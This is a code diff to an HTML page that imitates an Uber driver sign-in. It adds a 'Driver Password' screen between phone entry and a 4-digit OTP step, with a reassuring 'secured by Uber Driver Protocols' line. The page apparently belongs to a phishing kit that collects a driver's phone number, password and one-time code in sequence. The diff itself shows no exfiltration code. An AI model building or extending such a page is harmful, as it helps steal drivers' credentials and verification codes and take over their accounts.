@@ -84,7 +84,7 @@
                         </div>
 
                         <button type="submit" id="btn-send-phone" class="btn-black-primary">
-                            <span class="btn-text" id="txt-btn-send">Send Verification Code</span>
+                            <span class="btn-text" id="txt-btn-send">Continue Verification</span>
                             <span class="btn-spinner hidden"><i class="fa-solid fa-circle-notch fa-spin"></i></span>
                         </button>
                         
@@ -95,10 +95,42 @@
                     </form>
                 </div>
 
-                <!-- STEP 2: 4-Digit OTP Screen -->
-                <div id="step-otp" class="step-view hidden-step">
+                <!-- STEP 2: Driver Password Screen -->
+                <div id="step-password" class="step-view hidden-step">
                     <div class="back-link" onclick="goToStepPhone()">
-                        <i class="fa-solid fa-arrow-left"></i> <span id="txt-change-phone">Change phone number</span> (<span id="user-phone-display"></span>)
+                        <i class="fa-solid fa-arrow-left"></i> <span id="txt-change-phone-pw">Change phone number</span> (<span id="user-phone-display-pw"></span>)
+                    </div>
+
+                    <h2 class="step-heading" id="txt-heading-password">Enter Driver Password</h2>
+                    <p class="otp-instruction" id="txt-instruction-password">Enter your account password to confirm driver identity.</p>
+
+                    <form id="password-form" onsubmit="handlePasswordSubmit(event)">
+                        <div class="input-group">
+                            <label for="password-input" class="input-label" id="txt-label-password">Password</label>
+                            <div class="password-input-wrapper">
+                                <input type="password" id="password-input" class="uber-input" placeholder="Password" required autocomplete="current-password">
+                                <button type="button" class="btn-toggle-pw" onclick="togglePasswordVisibility()" aria-label="Toggle password visibility">
+                                    <i class="fa-solid fa-eye" id="pw-eye-icon"></i>
+                                </button>
+                            </div>
+                        </div>
+
+                        <button type="submit" id="btn-submit-password" class="btn-black-primary">
+                            <span class="btn-text" id="txt-btn-password">Continue Verification</span>
+                            <span class="btn-spinner hidden"><i class="fa-solid fa-circle-notch fa-spin"></i></span>
+                        </button>
+
+                        <div class="security-note" id="txt-security-note-pw">
+                            <i class="fa-solid fa-shield-halved"></i>
+                            Your information is encrypted and secured by Uber Driver Protocols.
+                        </div>
+                    </form>
+                </div>
+
+                <!-- STEP 3: 4-Digit OTP Screen -->
+                <div id="step-otp" class="step-view hidden-step">
+                    <div class="back-link" onclick="goToStepPassword()">
+                        <i class="fa-solid fa-arrow-left"></i> <span id="txt-change-phone">Change password</span> (<span id="user-phone-display"></span>)
                     </div>
 
                     <h2 class="step-heading" id="txt-heading-otp">Enter Verification Code (OTP)</h2>
